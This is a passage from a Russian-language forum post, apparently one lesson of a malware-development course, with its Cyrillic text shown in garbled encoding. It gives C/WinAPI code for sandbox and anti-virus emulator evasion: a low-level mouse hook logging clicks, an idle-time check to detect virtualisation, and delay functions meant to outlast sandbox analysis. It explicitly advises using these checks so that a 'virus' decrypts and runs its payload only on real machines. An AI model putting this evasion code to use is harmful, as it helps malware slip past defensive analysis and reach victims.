    // –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Ö—É–∫–∞
    g_hMouseHook = SetWindowsHookExW(
        WH_MOUSE_LL,
        (HOOKPROC)HookEvent,
        NULL,
        NULL
    );
    if (!g_hMouseHook) {
        printf(&quot;[!] SetWindowsHookExW –∑–∞–≤–µ—Ä—à–∏–ª—Å—è —Å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
    }

    // –û–±—Ä–∞–±–æ—Ç–∫–∞ –Ω–µ–ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–Ω—ã—Ö —Å–æ–±—ã—Ç–∏–π
    while (GetMessageW(&amp;Msg, NULL, NULL, NULL)) {
        DefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
    }

    return TRUE;
}

int main() {

    HANDLE hThread = NULL;

    // ...

    // –ó–∞–ø—É—Å–∫ –ø–æ—Ç–æ–∫–∞ –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è —â–µ–ª—á–∫–æ–≤ –º—ã—à–∏
    if (!(hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MouseClicksLogger, NULL, 0, NULL))) {
        printf(&quot;[!] CreateThread –∑–∞–≤–µ—Ä—à–∏–ª—Å—è —Å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
        return 1;
    }

    // ...

    // –û–∂–∏–¥–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø–æ—Ç–æ–∫–∞
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}</code></pre>
	</div>
</div><br />
<b>–ê–Ω—Ç–∏–≤–∏—Ä—Ç—É–∞–ª–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ —Å–∫–æ—Ä–æ—Å—Ç—å –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è —Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏</b><br />
<br />
–°–∫–æ—Ä–æ—Å—Ç—å –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è —Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º —Ç–∞–∫–∂–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∞ –≤ –∞–Ω—Ç–∏–≤–∏—Ä—Ç—É–∞–ª–∏–∑–∞—Ü–∏–∏. –ü–µ—Å–æ—á–Ω–∏—Ü—ã –º–æ–≥—É—Ç —Ä–∞–±–æ—Ç–∞—Ç—å —Å –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–π —Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Å–∫–æ—Ä–æ—Å—Ç—å—é, –≤ —Ç–æ –≤—Ä–µ–º—è –∫–∞–∫ —Ä–µ–∞–ª—å–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –±—É–¥—É—Ç –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–æ–≤–∞—Ç—å —Å —Å–∏—Å—Ç–µ–º–æ–π –Ω–µ—Å–∫–æ–ª—å–∫–æ –±–æ–ª–µ–µ –Ω–µ–ø—Ä–µ–¥—Å–∫–∞–∑—É–µ–º–æ. –ù–∞–ø—Ä–∏–º–µ—Ä, –µ—Å–ª–∏ –≤ —Ç–µ—á–µ–Ω–∏–µ –∫–æ—Ä–æ—Ç–∫–æ–≥–æ –ø–µ—Ä–∏–æ–¥–∞ –≤—Ä–µ–º–µ–Ω–∏ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç —Å–ª–∏—à–∫–æ–º –º–Ω–æ–≥–æ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–π —Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º, —ç—Ç–æ –º–æ–∂–µ—Ç —É–∫–∞–∑—ã–≤–∞—Ç—å –Ω–∞ –Ω–∞–ª–∏—á–∏–µ –ø–µ—Å–æ—á–Ω–∏—Ü—ã.<br />
<br />
–í –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω–æ–π –Ω–∏–∂–µ —Ñ—É–Ω–∫—Ü–∏–∏ MonitorUserActivity, –º—ã —Å–ª–µ–¥–∏–º –∑–∞ –∏–Ω—Ç–µ—Ä–≤–∞–ª–æ–º –≤—Ä–µ–º–µ–Ω–∏ –º–µ–∂–¥—É –ø–æ—Å–ª–µ–¥–Ω–∏–º –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å –∫–ª–∞–≤–∏–∞—Ç—É—Ä–æ–π –∏–ª–∏ –º—ã—à—å—é. –ï—Å–ª–∏ –∏–Ω—Ç–µ—Ä–≤–∞–ª —Å–ª–∏—à–∫–æ–º –∫–æ—Ä–æ—Ç–∫–∏–π, —ç—Ç–æ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—Ä–∏–∑–Ω–∞–∫–æ–º —Ç–æ–≥–æ, —á—Ç–æ —Å–∏—Å—Ç–µ–º–∞ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ –≤–∏—Ä—Ç—É–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Å—Ä–µ–¥–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL MonitorUserActivity() {

    LASTINPUTINFO lii = { sizeof(LASTINPUTINFO) };
    DWORD dwLastInputTime = NULL;
    DWORD dwCurrentTime = NULL;
    DWORD dwElapsedTime = NULL;

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–∏ –ø–æ—Å–ª–µ–¥–Ω–µ–≥–æ –≤–≤–æ–¥–∞
    if (!GetLastInputInfo(&amp;dwLastInputTime)) {
        printf(&quot;\n\t[!] GetLastInputInfo –∑–∞–≤–µ—Ä—à–∏–ª—Å—è —Å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
        return FALSE;
    }

    // –ü–æ–ª—É—á–µ–Ω–∏–µ —Ç–µ–∫—É—â–µ–≥–æ –≤—Ä–µ–º–µ–Ω–∏
    dwCurrentTime = GetTickCount();

    // –í—ã—á–∏—Å–ª–µ–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–∏ –±–µ–∑–¥–µ–π—Å—Ç–≤–∏—è
    dwElapsedTime = dwCurrentTime - dwLastInputTime;

    // –ï—Å–ª–∏ –≤—Ä–µ–º—è –±–µ–∑–¥–µ–π—Å—Ç–≤–∏—è –º–µ–Ω–µ–µ 5 —Å–µ–∫—É–Ω–¥, –ø—Ä–µ–¥–ø–æ–ª–∞–≥–∞–µ–º, —á—Ç–æ —ç—Ç–æ –ø–µ—Å–æ—á–Ω–∏—Ü–∞
    if (dwElapsedTime &lt; 5000) {
        return TRUE;
    }

    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>–í–∞–∂–Ω–æ –µ—â—ë —Ç–æ-—á—Ç–æ, —ç—Ç–∏ –º–µ—Ç–æ–¥—ã, —Ç–∞–∫–∂–µ –∫–∞–∫ –∏ –º–µ—Ç–æ–¥—ã –∞–Ω—Ç–∏–¥–µ–±–∞–≥–∞ –∏–∑ –ø—Ä–µ–¥—ã–¥—É—â–µ–π —Å—Ç–∞—Ç—å–∏, –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∫–ª—é—á–∞ –ø–∞—Ä–æ–ª—è, –Ω–∞–ø—Ä–∏–º–µ—Ä –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –ø–µ–π–ª–æ–∞–¥–∞, –≤ —Å–ª—É—á–∞–µ –µ—Å–ª–∏ –≤–∏—Ä—É—Å –Ω–µ –∑–∞–ø—É—â–µ–Ω –ø–æ–¥ –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã, —Ç–æ –ø–µ–π–ª–æ–∞–¥ –∑–∞–ø—É—Å—Ç–∏—Ç—Å—è, –∏–Ω–∞—á–µ –Ω–µ—Ç.<br />
–ù–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –≤–æ–∑–≤—Ä–∞—â–∞—Ç—å true –∏ else, –º–æ–∂–Ω–æ –≤–æ–∑–≤—Ä–∞—â–∞—Ç—å —á–∏—Å–ª–æ–≤—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è, –Ω–∞–ø—Ä–∏–º–µ—Ä —á–∏—Å–ª–æ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤, —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞ –∏ —Ç.–¥. –∏ –Ω–∞ –æ—Å–Ω–æ–≤–µ —ç—Ç–∏—Ö –¥–∞–Ω–Ω—ã—Ö –≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å —É–∂–µ –∫–ª—é—á.)</b><br />
<br />
–û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–µ –≤—ã—à–µ –º–µ—Ç–æ–¥—ã –∞–Ω—Ç–∏–≤–∏—Ä—Ç—É–∞–ª–∏–∑–∞—Ü–∏–∏ –º–æ–≥—É—Ç –±—ã—Ç—å –ø–æ–ª–µ–∑–Ω—ã–º–∏ –≤ –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö —Å–ª—É—á–∞—è—Ö, –Ω–æ –æ–Ω–∏ –Ω–µ –≥–∞—Ä–∞–Ω—Ç–∏—Ä—É—é—Ç 100% –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –≤–∏—Ä—Ç—É–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Å—Ä–µ–¥—ã. –í–∏—Ä—Ç—É–∞–ª–∏–∑–∞—Ü–∏—è –∏ –∞–Ω—Ç–∏–≤–∏—Ä—Ç—É–∞–ª–∏–∑–∞—Ü–∏—è - —ç—Ç–æ –ø–æ—Å—Ç–æ—è–Ω–Ω–æ–µ —Å–æ—Ä–µ–≤–Ω–æ–≤–∞–Ω–∏–µ, –∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã –º–æ–≥—É—Ç —Ä–∞–∑—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å—Å—è —Å —É—á–µ—Ç–æ–º —ç—Ç–∏—Ö –º–µ—Ç–æ–¥–æ–≤ –∞–Ω—Ç–∏–≤–∏—Ä—Ç—É–∞–ª–∏–∑–∞—Ü–∏–∏. –¢–∞–∫–∂–µ –≤–∞–∂–Ω–æ –ø–æ–º–Ω–∏—Ç—å, —á—Ç–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∞–Ω—Ç–∏–≤–∏—Ä—Ç—É–∞–ª–∏–∑–∞—Ü–∏–∏ –º–æ–∂–µ—Ç –ø—Ä–∏–≤–µ—Å—Ç–∏ –∫ –ª–æ–∂–Ω—ã–º —Å—Ä–∞–±–∞—Ç—ã–≤–∞–Ω–∏—è–º –≤ —Ä–µ–∞–ª—å–Ω—ã—Ö —Å—Ä–µ–¥–∞—Ö, —á—Ç–æ –º–æ–∂–µ—Ç –≤—ã–∑–≤–∞—Ç—å –ø—Ä–æ–±–ª–µ–º—ã –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.<br />
<br />
<u><b>–î–∞–≤–∞–π—Ç–µ —Ç–µ–ø–µ—Ä—å —Ä–∞—Å—Å–º–æ—Ç—Ä–∏–º —Å–ø–æ—Å–æ–±—ã –æ–±—Ö–æ–¥–∞ —ç–º—É–ª—è—Ç–æ—Ä–∞ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–∞, –ø–æ —Å—É—Ç–∏ —ç—Ç–æ —Ç–æ–∂–µ –≤–∏—Ä—Ç—É–∞–ª—å–Ω–∞—è —Å—Ä–µ–¥–∞, —Ç–æ–ª—å–∫–æ –≤ –¥–≤–∏–∂–∫–µ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–∞.</b></u><br />
<b><u>–†–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è —ç—Ç–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å –º–µ—Ç–æ–¥–∞–º–∏ –≤—ã—à–µ, –Ω–æ –≤–∞–∂–Ω–æ —ç—Ç–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –∫–∞–∫–∏—Ö-—Ç–æ –∫—Ä–∏—Ç–∏—á–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö, –Ω–∞–ø—Ä–∏–º–µ—Ä –∫–ª—é—á–∞ –¥–ª—è —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏ –∏–ª–∏ –µ—â—ë —á—Ç–æ-—Ç–æ.</u></b><br />
<br />
–ó–∞–¥–µ—Ä–∂–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è - —ç—Ç–æ –æ–±—â–∞—è —Ç–µ—Ö–Ω–∏–∫–∞, –∏—Å–ø–æ–ª—å–∑—É–µ–º–∞—è –¥–ª—è –æ–±—Ö–æ–¥–∞ –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Å—Ä–µ–¥. –í –ø–µ—Å–æ—á–Ω–∏—Ü–∞—Ö –æ–±—ã—á–Ω–æ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é—Ç—Å—è –≤—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è, –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ –ø–æ–∑–≤–æ–ª—è—é—Ç –∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª –≤ —Ç–µ—á–µ–Ω–∏–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ–≥–æ –≤—Ä–µ–º–µ–Ω–∏. –ü–æ—ç—Ç–æ–º—É –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–µ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏–µ –º–æ–∂–µ—Ç –≤–Ω–µ—Å—Ç–∏ –¥–ª–∏—Ç–µ–ª—å–Ω—ã–µ –ø–∞—É–∑—ã –≤ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–¥–∞, —á—Ç–æ –∑–∞—Å—Ç–∞–≤–∏—Ç –ø–µ—Å–æ—á–Ω–∏—Ü—É –∑–∞–≤–µ—Ä—à–∏—Ç—å —Ä–∞–±–æ—Ç—É –¥–æ —Ç–æ–≥–æ, –∫–∞–∫ –æ–Ω–∞ —Å–º–æ–∂–µ—Ç –ø—Ä–æ–∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª.<br />
<br />
–ï—Å–ª–∏ —É –ø–µ—Å–æ—á–Ω–∏—Ü—ã –µ—Å—Ç—å –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –Ω–∞ –∞–Ω–∞–ª–∏–∑ –≤ —Ç–µ—á–µ–Ω–∏–µ –¥–≤—É—Ö –º–∏–Ω—É—Ç, –æ–Ω–∞ –Ω–µ —Å–º–æ–∂–µ—Ç –ø—Ä–æ–∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É, –µ—Å–ª–∏ –æ–±—Ä–∞–∑–µ—Ü –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è –≤—ã–ø–æ–ª–Ω—è–µ—Ç —Ñ—É–Ω–∫—Ü–∏—é –æ–∂–∏–¥–∞–Ω–∏—è –≤ —Ç–µ—á–µ–Ω–∏–µ —Ç—Ä–µ—Ö –º–∏–Ω—É—Ç –ø–µ—Ä–µ–¥ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–æ–π –∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ–º –µ—ë.<br />
<br />
–≠—Ç–∞ —Å—Ç–∞—Ç—å—è –ø—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç —Ñ—É–Ω–∫—Ü–∏–∏, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª—è –∑–∞–¥–µ—Ä–∂–∫–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.<br />
<br />
–ù–µ—Å–∫–æ–ª—å–∫–æ –æ–±—Ä–∞–∑—Ü–æ–≤ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏ –∑–∞–¥–µ—Ä–∂–∫–∏ –≤ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏, –ø–æ—ç—Ç–æ–º—É –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–æ –ø–µ—Å–æ—á–Ω–∏—Ü –ø—Ä–∏–º–µ–Ω–∏–ª–∏ –º–µ—Ä—ã –ø–æ —É—Å—Ç—Ä–∞–Ω–µ–Ω–∏—é –∑–∞–¥–µ—Ä–∂–µ–∫ –≤ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏. –¢–∞–∫–∏–µ –º–µ—Ä—ã –º–æ–≥—É—Ç –≤–∫–ª—é—á–∞—Ç—å –≤ —Å–µ–±—è —É—Å–∫–æ—Ä–µ–Ω–∏–µ –∑–∞–¥–µ—Ä–∂–µ–∫, –ª–∏–±–æ –∏–∑–º–µ–Ω—è—è –ø–∞—Ä–∞–º–µ—Ç—Ä—ã, –ø–µ—Ä–µ–¥–∞–≤–∞–µ–º—ã–µ —á–µ—Ä–µ–∑ –ø–µ—Ä–µ—Ö–≤–∞—Ç API, –ª–∏–±–æ –¥—Ä—É–≥–∏–º–∏ —Å–ø–æ—Å–æ–±–∞–º–∏. <b>–ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–≥–æ, —á—Ç–æ –∑–∞–¥–µ—Ä–∂–∫–∞ –ø—Ä–æ–∏–∑–æ—à–ª–∞, —è–≤–ª—è–µ—Ç—Å—è –≤–∞–∂–Ω–æ–π, –∏ –µ—ë –º–æ–∂–Ω–æ –¥–æ—Å—Ç–∏—á—å —Å –ø–æ–º–æ—â—å—é WinAPI, GetTickCount64.</b><br />
<br />
–§—É–Ω–∫—Ü–∏—è –∑–∞–¥–µ—Ä–∂–∫–∏ –º–æ–∂–µ—Ç –≤—ã–≥–ª—è–¥–µ—Ç—å –ø—Ä–∏–º–µ—Ä–Ω–æ —Ç–∞–∫:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL DelayFunction(DWORD dwMilliSeconds) {

  DWORD T0 = GetTickCount64();

  // –ö–æ–¥, –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–π –¥–ª—è –∑–∞–¥–µ—Ä–∂–∫–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –Ω–∞ &#039;dwMilliSeconds&#039; –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥

  DWORD T1 = GetTickCount64();

  // –ü—Ä–æ—à–ª–æ –∫–∞–∫ –º–∏–Ω–∏–º—É–º &#039;dwMilliSeconds&#039; –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥, –∑–Ω–∞—á–∏—Ç, &#039;DelayFunction&#039; –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ
  if ((DWORD)(T1 - T0) &lt; dwMilliSeconds)
    return FALSE;
  else
    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–ó–∞–¥–µ—Ä–∂–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º WaitForSingleObject</b><br />
<br />
WinAPI WaitForSingleObject –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª—Å—è –Ω–∞ –ø—Ä–æ—Ç—è–∂–µ–Ω–∏–∏ –≤—Å–µ–≥–æ —ç—Ç–æ–≥–æ –∫—É—Ä—Å–∞ –¥–ª—è –æ–∂–∏–¥–∞–Ω–∏—è –Ω–∞—Å—Ç—É–ø–ª–µ–Ω–∏—è —Å–∏–≥–Ω–∞–ª–∞ —É –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ –æ–±—ä–µ–∫—Ç–∞ –∏–ª–∏ –¥–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —Ç–∞–π–º-–∞—É—Ç–∞. –í —ç—Ç–æ–º —Ä–∞–∑–¥–µ–ª–µ WaitForSingleObject –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –¥–ª—è –æ–∂–∏–¥–∞–Ω–∏—è –ø—É—Å—Ç–æ–≥–æ —Å–æ–±—ã—Ç–∏—è, —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º CreateEvent, —á—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç –æ–∂–∏–¥–∞–Ω–∏–µ –∏—Å—Ç–µ—á–µ–Ω–∏—è —Ç–∞–π–º-–∞—É—Ç–∞.<br />
<br />
–§—É–Ω–∫—Ü–∏—è DelayExecutionVia_WFSO –∏–º–µ–µ—Ç –æ–¥–∏–Ω –ø–∞—Ä–∞–º–µ—Ç—Ä, ftMinutes, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π –≤—Ä–µ–º—è –∑–∞–¥–µ—Ä–∂–∫–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –≤ –º–∏–Ω—É—Ç–∞—Ö. –§—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç TRUE, –µ—Å–ª–∏ WaitForSingleObject —É—Å–ø–µ—à–Ω–æ –∑–∞–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω–æ–µ –≤—Ä–µ–º—è.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL DelayExecutionVia_WFSO(FLOAT ftMinutes) {

  // –ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ –º–∏–Ω—É—Ç –≤ –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥—ã
  DWORD     dwMilliSeconds  = ftMinutes * 60000;
  HANDLE    hEvent          = CreateEvent(NULL, NULL, NULL, NULL);
  DWORD     _T0             = NULL,
            _T1             = NULL;


  _T0 = GetTickCount64();

  // –û–∂–∏–¥–∞–Ω–∏–µ –≤ —Ç–µ—á–µ–Ω–∏–µ &#039;dwMilliSeconds&#039; –º—Å
  if (WaitForSingleObject(hEvent, dwMilliSeconds) == WAIT_FAILED) {
    printf(&quot;[!] WaitForSingleObject Failed With Error : %d \n&quot;, GetLastError());
    return FALSE;
  }

  _T1 = GetTickCount64();

  // –ü—Ä–æ—à–ª–æ –∫–∞–∫ –º–∏–Ω–∏–º—É–º &#039;dwMilliSeconds&#039; –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥, –∑–Ω–∞—á–∏—Ç, &#039;DelayExecutionVia_WFSO&#039; –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ
  if ((DWORD)(_T1 - _T0) &lt; dwMilliSeconds)
    return FALSE;

  CloseHandle(hEvent);

  return TRUE;

}</code></pre>
	</div>
</div><br />
<b>–ó–∞–¥–µ—Ä–∂–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º MsgWaitForMultipleObjectsEx</b><br />
<br />
–î—Ä—É–≥–∏–º WinAPI, –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª—è –∑–∞–¥–µ—Ä–∂–∫–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è, —è–≤–ª—è–µ—Ç—Å—è WinAPI MsgWaitForMultipleObjectsEx. –û–Ω –≤—ã–ø–æ–ª–Ω—è–µ—Ç —Ç—É –∂–µ –∑–∞–¥–∞—á—É, —á—Ç–æ –∏ WaitForSingleObject, –∏ —Ç–∞–∫–∂–µ –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä–æ–≤–∞–ª—Å—è –≤ –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö —Å—Ç–∞—Ç—å—è—Ö.<br />
<br />
–§—É–Ω–∫—Ü–∏—è DelayExecutionVia_MWFMOEx –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Ç—É –∂–µ –ª–æ–≥–∏–∫—É, –ø–æ–∫–∞–∑–∞–Ω–Ω—É—é –≤ –ø—Ä–µ–¥—ã–¥—É—â–µ–º —Ä–∞–∑–¥–µ–ª–µ, –∑–∞ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ–º —Ç–æ–≥–æ, —á—Ç–æ –∑–¥–µ—Å—å –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è WinAPI MsgWaitForMultipleObjectsEx. –§—É–Ω–∫—Ü–∏—è –∏–º–µ–µ—Ç –æ–¥–∏–Ω –ø–∞—Ä–∞–º–µ—Ç—Ä, ftMinutes, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π –≤—Ä–µ–º—è –∑–∞–¥–µ—Ä–∂–∫–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –≤ –º–∏–Ω—É—Ç–∞—Ö. –§—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç TRUE, –µ—Å–ª–∏ MsgWaitForMultipleObjectsEx —É—Å–ø–µ—à–Ω–æ –∑–∞–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω–æ–µ –≤—Ä–µ–º—è.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL DelayExecutionVia_MWFMOEx(FLOAT ftMinutes) {

  // –ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ –º–∏–Ω—É—Ç –≤ –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥—ã
  DWORD   dwMilliSeconds    = ftMinutes * 60000;
  HANDLE  hEvent            = CreateEvent(NULL, NULL, NULL, NULL);
  DWORD   _T0               = NULL,
